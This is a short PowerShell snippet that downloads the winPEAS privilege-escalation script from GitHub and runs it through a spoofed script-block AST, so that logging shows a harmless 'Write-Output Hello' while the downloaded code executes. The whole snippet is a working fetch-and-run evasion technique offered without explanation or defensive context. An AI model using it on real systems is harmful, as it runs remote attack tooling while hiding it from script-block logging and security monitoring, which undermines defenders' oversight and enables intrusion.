$c = (new-Object net.webclient).downloadstring('https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1')
$SpoofedAst = [ScriptBlock]::Create("Write-Output 'Hello'").Ast  
$ExecutedAst = [ScriptBlock]::Create("$c").Ast
$Ast = [System.Management.Automation.Language.ScriptBlockAst]::new($SpoofedAst.Extent,
                                                                   $null,
                                                                   $null,
                                                                   $null,
                                                                   $ExecutedAst.EndBlock.Copy(),
                                                                   $null)
$Sb = $Ast.GetScriptBlock()
& $Sb
